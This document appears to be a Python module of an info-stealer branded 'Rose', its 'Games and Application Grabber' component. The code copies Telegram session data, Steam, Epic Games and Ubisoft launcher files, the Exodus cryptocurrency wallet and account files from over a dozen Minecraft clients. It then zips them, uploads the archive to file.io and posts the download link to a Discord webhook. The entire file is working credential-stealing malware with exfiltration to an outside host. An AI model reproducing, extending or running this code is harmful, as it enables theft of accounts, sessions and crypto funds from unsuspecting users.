import os
from bin.webhook import _WebhookX
from datetime import datetime
import shutil
import requests
from dhooks import Embed
from bin.config import Config
import zipfile

class get_games():
    def __init__(self):
        self.cc = Config()

        self.webx = _WebhookX().get_object()

        self.embed = Embed(
            title='Rose Report',
            description='Rose Instance - Games and Application Grabber',
            color=self.cc.get_color(),
            timestamp=datetime.now().isoformat()
        )

        self.embed.set_author(name=self.cc.get_name(), icon_url=self.cc.get_avatar())
        self.embed.set_footer(text=self.cc.get_footer(), icon_url=self.cc.get_avatar())

        self.userProfile = os.getenv("userprofile")
        self.roaming = os.getenv("appdata")
        self.tdata_path = os.path.join(self.roaming, 'Telegram Desktop', 'tdata')
        self.uplay_launcher_path = os.path.join(self.roaming, 'Ubisoft Game Launcher')
        self.epic_games_path = os.path.join(self.roaming, 'EpicGamesLauncher', 'Saved')
        self.steam_path = r'C:\Program Files (x86)\Steam\config'
        self.exodus_path = os.path.join(self.roaming, 'Exodus', 'exodus.wallet')
        self.minecraftPaths = {
                "Intent": os.path.join(self.userProfile, "intentlauncher", "launcherconfig"),
                "Lunar": os.path.join(self.userProfile, ".lunarclient", "settings", "game", "accounts.json"),
                "TLauncher": os.path.join(self.roaming, ".minecraft", "TlauncherProfiles.json"),
                "Feather": os.path.join(self.roaming, ".feather", "accounts.json"),
                "Meteor": os.path.join(self.roaming, ".minecraft", "meteor-client", "accounts.nbt"),
                "Impact": os.path.join(self.roaming, ".minecraft", "Impact", "alts.json"),
                "Novoline": os.path.join(self.roaming, ".minectaft", "Novoline", "alts.novo"),
                "CheatBreakers": os.path.join(self.roaming, ".minecraft", "cheatbreaker_accounts.json"),
                "Microsoft Store": os.path.join(self.roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
                "Rise": os.path.join(self.roaming, ".minecraft", "Rise", "alts.txt"),
                "Rise (Intent)": os.path.join(self.userProfile, "intentlauncher", "Rise", "alts.txt"),
                "Paladium": os.path.join(self.roaming, "paladium-group", "accounts.json"),
                "PolyMC": os.path.join(self.roaming, "PolyMC", "accounts.json"),
                "Badlion": os.path.join(self.roaming, "Badlion Client", "accounts.json"),
            }
        self.rose_path = os.path.join(self.roaming, 'roseontop')
        self.telegram_folder = os.path.join(self.rose_path, 'Telegram')
        self.steam_folder = os.path.join(self.rose_path, 'Steam')
        self.uplay_folder = os.path.join(self.rose_path, 'Uplay')
        self.minecraft_folder = os.path.join(self.rose_path, 'Minecraft')
        self.epic_games_folder = os.path.join(self.rose_path, 'Epic Games')
        self.exodus_folder = os.path.join(self.rose_path, 'Exodus')
        self.games_zip = os.path.join(self.rose_path, 'Games.zip')

    def get_games(self):
        # Telegram
        
        if not os.path.exists(self.tdata_path):
            self.telegram_check = True
        else:
            self.telegram_check = False
        
        if os.path.exists(self.telegram_folder):
            shutil.rmtree(self.telegram_folder)    
            
        if os.path.exists(self.tdata_path):
            try:
                shutil.copytree(self.tdata_path, self.telegram_folder)
            except Exception:
                self.telegram_check = True
                pass

        # Epic Games

        if not os.path.exists(self.epic_games_path):
            self.epic_games_check = True
        else:
            self.epic_games_check = False
        
        if os.path.exists(self.epic_games_folder):
            shutil.rmtree(self.epic_games_folder)    
            
        if os.path.exists(self.epic_games_path):
            try:
                shutil.copytree(self.epic_games_path, self.epic_games_folder)
            except Exception:
                self.epic_games_check = True
                pass

        # Steam

        if not os.path.exists(self.steam_path):
            self.steam_check = True
        else:
            self.steam_check = False
        
        if os.path.exists(self.steam_folder):
            shutil.rmtree(self.steam_folder)    
            
        if os.path.exists(self.steam_path):
            try:
                shutil.copytree(self.steam_path, self.steam_folder)
            except Exception:
                self.steam_check = True
                pass

        # Uplay

        if not os.path.exists(self.uplay_launcher_path):
            self.uplay_check = True
        else:
            self.uplay_check = False
        
        if os.path.exists(self.uplay_folder):
            shutil.rmtree(self.uplay_folder)    
            
        if os.path.exists(self.uplay_launcher_path):
            try:
                shutil.copytree(self.uplay_launcher_path, self.uplay_folder)
            except Exception:
                self.uplay_check = True
                pass

        # Exodus

        if not os.path.exists(self.exodus_path):
            self.exodus_check = True
        else:
            self.exodus_check = False
        
        if os.path.exists(self.exodus_folder):
            shutil.rmtree(self.exodus_folder)    
            
        if os.path.exists(self.exodus_path):
            try:
                shutil.copytree(self.exodus_path, self.exodus_folder)
            except Exception:
                self.exodus_check = True
                pass

        # Minecraft

        if os.path.exists(self.minecraft_folder):
            shutil.rmtree(self.minecraft_folder)
        
        self.minecraft_check = True
        for self.minecraftPath in self.minecraftPaths.values():
            if os.path.exists(self.minecraftPath):
                self.minecraft_check = False
                try:
                    print(os.path.basename(os.path.dirname(self.minecraftPath)))
                    print(os.path.join(self.minecraft_folder, os.path.basename(os.path.dirname(self.minecraftPath))))
                    if not os.path.exists(self.minecraft_folder):
                        os.mkdir(self.minecraft_folder)
                    if not os.path.exists(os.path.join(self.minecraft_folder, os.path.basename(os.path.dirname(self.minecraftPath)))):
                        os.mkdir(os.path.join(self.minecraft_folder, os.path.basename(os.path.dirname(self.minecraftPath))))
                    shutil.copy(self.minecraftPath, os.path.join(self.minecraft_folder, os.path.basename(os.path.dirname(self.minecraftPath))))
                except Exception as e:
                    pass

        # Create ZIP

        if (not self.epic_games_check or not self.steam_check or not self.uplay_check or not self.telegram_check or not self.minecraft_check or not self.exodus_check):
            if not os.path.exists(self.games_zip):
                with zipfile.ZipFile(self.games_zip, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
                    if not self.telegram_check:
                        for root, dirs, files in os.walk(self.telegram_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.telegram_folder)
                                arcname = os.path.join("Telegram", arcname)
                                zf.write(file_path, arcname)

                    if not self.epic_games_check:
                        for root, dirs, files in os.walk(self.epic_games_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.epic_games_folder)
                                arcname = os.path.join("Epic Games", arcname)
                                zf.write(file_path, arcname)

                    if not self.steam_check:
                        for root, dirs, files in os.walk(self.steam_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.steam_folder)
                                arcname = os.path.join("Steam", arcname)
                                zf.write(file_path, arcname)

                    if not self.uplay_check:
                        for root, dirs, files in os.walk(self.uplay_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.uplay_folder)
                                arcname = os.path.join("Uplay", arcname)
                                zf.write(file_path, arcname)

                    if not self.exodus_check:
                        for root, dirs, files in os.walk(self.exodus_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.exodus_folder)
                                arcname = os.path.join("Exodus", arcname)
                                zf.write(file_path, arcname)

                    if not self.minecraft_check:
                        for root, dirs, files in os.walk(self.minecraft_folder):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, self.minecraft_folder)
                                arcname = os.path.join("Minecraft", arcname)
                                zf.write(file_path, arcname)

            # Upload ZIP

            upload_url = "https://file.io"
            files = {"file": (self.games_zip, open(self.games_zip, "rb"))}
            response = requests.post(upload_url, files=files)

            if response.status_code == 200:
                self.download_link = response.json().get("link", "Unknown")
            else:
                self.download_link = "Unknown"
        
            self.embed.add_field(name='Games', value=f'[Download]({self.download_link})', inline=False)

            # Send embed with download link

            self.webx.send(embed=self.embed)